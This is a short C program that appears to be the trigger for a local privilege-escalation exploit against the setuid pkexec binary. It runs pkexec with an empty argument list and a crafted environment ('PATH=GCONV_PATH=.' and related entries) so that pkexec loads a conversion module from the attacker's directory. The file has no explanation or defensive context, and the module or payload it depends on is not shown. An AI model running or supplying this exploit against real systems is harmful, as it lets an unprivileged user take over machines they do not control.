#include <unistd.h>

int main() {
	char *envvars[] = {
		"modules",
		"PATH=GCONV_PATH=.",
		"LC_MESSAGES=en_us.UTF-8",
		"XAUTHORITY=../MODULES",
		NULL
	};

	char *args[] = {
		NULL
	};

	execve("/usr/bin/pkexec", args, envvars);
}
